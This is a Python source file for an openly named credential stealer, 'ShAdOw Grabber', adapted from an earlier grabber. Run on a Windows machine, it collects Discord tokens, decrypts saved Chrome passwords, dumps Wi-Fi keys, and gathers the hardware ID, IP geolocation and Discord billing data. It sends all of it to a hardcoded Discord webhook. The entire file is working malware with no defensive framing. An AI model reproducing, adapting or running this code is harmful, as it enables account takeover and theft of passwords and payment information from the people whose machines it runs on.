#CREDITS: 'https://github.com/Rdimo' for base code :) 
# Modified version of 'Hazard Grabber' -- Name: ShAdOw Grabber

import os
if os.name != "nt":
	exit()
import sys
import base64
from json import loads, dumps
import json
from Crypto.Cipher import AES
from base64 import b64decode
import subprocess
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import timezone, datetime, timedelta

webhook_url = "https://discord.com/api/webhooks/913148858337489016/p1xUBbcRJFmCmtcC7qJ3TuMIeYGT7BtYDgEFG2hMIxO5Y5c5p76Gf8P4zjG3G2A8IlyE"
path = r'C:\Windows\Temp\LocalCustom\ssh\new\custom'
if not os.path.exists(path):
    os.makedirs(path)

languages = {
	'da'    : 'Danish, Denmark',
	'de'    : 'German, Germany',
	'en-GB' : 'English, United Kingdom',
	'en-US' : 'English, United States',
	'es-ES' : 'Spanish, Spain',
	'fr'    : 'French, France',
	'hr'    : 'Croatian, Croatia',
	'lt'    : 'Lithuanian, Lithuania',
	'hu'    : 'Hungarian, Hungary',
	'nl'    : 'Dutch, Netherlands',
	'no'    : 'Norwegian, Norway',
	'pl'    : 'Polish, Poland',
	'pt-BR' : 'Portuguese, Brazilian, Brazil',
	'ro'    : 'Romanian, Romania',
	'fi'    : 'Finnish, Finland',
	'sv-SE' : 'Swedish, Sweden',
	'vi'    : 'Vietnamese, Vietnam',
	'tr'    : 'Turkish, Turkey',
	'cs'    : 'Czech, Czechia, Czech Republic',
	'el'    : 'Greek, Greece',
	'bg'    : 'Bulgarian, Bulgaria',
	'ru'    : 'Russian, Russia',
	'uk'    : 'Ukranian, Ukraine',
	'th'    : 'Thai, Thailand',
	'zh-CN' : 'Chinese, China',
	'ja'    : 'Japanese',
	'zh-TW' : 'Chinese, Taiwan',
	'ko'    : 'Korean, Korea'
}

chromefile = 'chrome_dump.txt'
comepleteName = os.path.join(path,chromefile)
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb",
	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Opera GX"			: ROAMING + "\\Opera Software\\Opera GX Stable",
	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
}
def install (package):
    subprocess. check_call ([sys. executable, "-m", "pip", "install", package])
try:
	import win32crypt
	from dhooks import Webhook, File
except ImportError or NameError:
	install('pywin32')
	install('dhooks')
try:
	import shutil
	import requests
	import sqlite3
	import platform as plt
	from re import findall
	import getpass
except ImportError or NameError:
	install('shutil')
	install('re')
	install('requests')
	install('sqlite3')
	install('platform')
	install('getpass')
	import shutil
	import requests
	import sqlite3
	import platform as plt
	from re import findall
	import getpass

sysinfo = f"""
        Operating System: {plt.system()}
        Computer Name: {plt.node()}
        Username: {getpass.getuser()}
        Release Version: {plt.release()}
        Processor Architecture: {plt.processor()}
                    """
hook = Webhook(webhook_url)
def getheaders(token=None, content_type="application/json"):
	headers = {
		"Content-Type": content_type,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
	}
	if token:
		headers.update({"Authorization": token})
	return headers

def getuserdata(token):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
	except:
		pass
		
def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	return tokens

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def chrome():
	f = open(comepleteName, "w") 
	key = get_encryption_key()
	db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
							"Google", "Chrome", "User Data", "default", "Login Data")
	filename = "ChromeData.db"
	shutil.copyfile(db_path, filename)
	db = sqlite3.connect(filename)
	cursor = db.cursor()
	cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
	for row in cursor.fetchall():
		origin_url = row[0]
		action_url = row[1]
		username = row[2]
		password = decrypt_password(row[3], key)
		date_created = row[4]
		date_last_used = row[5]    
		
		if username or password:
			Origin_Url1 =f"\nOrigin URL: {origin_url}\n"
			f.write(Origin_Url1)
			Action_URL1 = f"Action URL: {action_url}\n"
			f.write(Action_URL1)
			Username1 = f"Username: {username}\n"
			f.write(Username1)
			password1 = f"Password: {password}\n"
			f.write(password1)
		else:
			continue
		if date_created != 86400000000 and date_created:
			Creation_date1 = f"Creation date: {str(get_chrome_datetime(date_created))}\n"
			f.write(Creation_date1)
		if date_last_used != 86400000000 and date_last_used:
			Last_Used1 = f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
			f.write(Last_Used1)
		blah = "="*50
		f.write(blah)

	cursor.close()
	db.close()
	try:
		os.remove(filename)
		os.remove(comepleteName)
	except:
		pass
		f.close()

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def getwifi():
    global answer
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
            'utf-8').split(
            '\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            d = ("{:<30}|  {:<}".format(i, results[0]))
            answer = d
        except IndexError:
            p = ("{:<30}|  {:<}".format(i, ""))
            answer = p
    return answer

def get_chrome_file():
	hook.modify(name='ShAdOw Grabber', avatar=None)
	file = File(comepleteName, name='chrome_dump.txt')
	hook.send(f'chrome dump:', file=file)

def getip():
	ip = org = loc = city = country = region = googlemap = "None"
	try:
		url = 'http://ipinfo.io/json'
		response = urlopen(url)
		data = json.load(response)
		ip = data['ip']
		org = data['org']
		loc = data['loc']
		city = data['city']
		country = data['country']
		region = data['region']
		googlemap = "https://www.google.com/maps/search/google+map++" + loc
	except:
		pass
	return ip,org,loc,city,country,region,googlemap

def getavatar(uid, aid):
	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
	try:
		urlopen(Request(url))
	except:
		url = url[:-4]
	return url
 
def has_payment_methods(token):
	global nitro_data
	try:
		nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
	except:
		pass

def tokengrabber():
	embeds = []
	working = []
	checked = []
	working_ids = []
	computer_os = plt.platform()
	getwifinetwork,getwifipassword = getwifi().split('|')
	chrome_dump = chrome()
	getchromefile = get_chrome_file()
	ip,org,loc,city,country,region,googlemap = getip()
	pc_username = os.getenv("UserName")
	pc_name = os.getenv("COMPUTERNAME")
	for platform, path in PATHS.items():
		if not os.path.exists(path):
			continue
		for token in gettokens(path):
			if token in checked:
				continue
			checked.append(token)
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in working_ids:
					continue
			user_data = getuserdata(token)
			if not user_data:
				continue
			working_ids.append(uid)
			working.append(token)
			username = user_data["username"] + "#" + str(user_data["discriminator"])
			user_id = user_data["id"]
			locale = user_data['locale']
			avatar_id = user_data["avatar"]
			avatar_url = getavatar(user_id, avatar_id)
			email = user_data.get("email")
			phone = user_data.get("phone")
			verified = user_data['verified']
			mfa_enabled = user_data['mfa_enabled']
			flags = user_data['flags']
			creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime("%d-%m-%Y %H:%M:%S")

			language = languages.get(locale)
			nitro = bool(user_data.get("premium_type"))
			billing = bool(has_payment_methods(token))
			embed1 = {
				"color": 16507654,
				"fields": [
					{
						"name": "**Account Info**",
						"value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
						"inline": True
					},
					{
						"name": "**Pc Info**",
						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
						"inline": True
					},
					{
						"name": "--------------------------------------------------------------------------------------------------",
						"value":"**-----------------------------------------------------------------------------------------------**",
						"inline": False
					},
					{
						"name": "**IP**",
						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}\nOrg: {org}',
						"inline": True
					},
					{
						"name": "**Other Info**",
						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
						"inline": True
					},
					{
						"name": "**Token**",
						"value": f"`{token}`",
						"inline": False
					},
                    {
						"name": "--------------------------------------------------------------------------------------------------",
						"value":"**-----------------------------------------------------------------------------------------------**",
						"inline": False
					},
                    {
						"name": "**wifi**",
						"value":f'NETWORK: {getwifinetwork} PASSWORD: {getwifipassword}',
						"inline": True
					},
					{
						"name": "--------------------------------------------------------------------------------------------------",
						"value":"**--------------------------------------------------------------------------------------------------**",
						"inline": False
					},
					 {
						"name": "**Credit Card Information**",
						"value":f'{nitro_data}',
						"inline": True
					},
				],
				"author": {
					"name": f"{username}・{user_id}",
					"icon_url": avatar_url
				},
				"footer": {
					"text": "ShAdOw Grabber By ######・https://github.com/########"
				}
			}
			embeds.append(embed1)

	if len(working) == 0:
		working.append('123')
	webhook1 = {
		"content": "",
		"embeds": embeds,
		"username": "ShAdOw Grabber",
		"avatar_url": "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg"
	}
	try:
		urlopen(Request(webhook_url, data=dumps(webhook1).encode(), headers=getheaders()))
	except Exception as e:
		print(e)
tokengrabber()

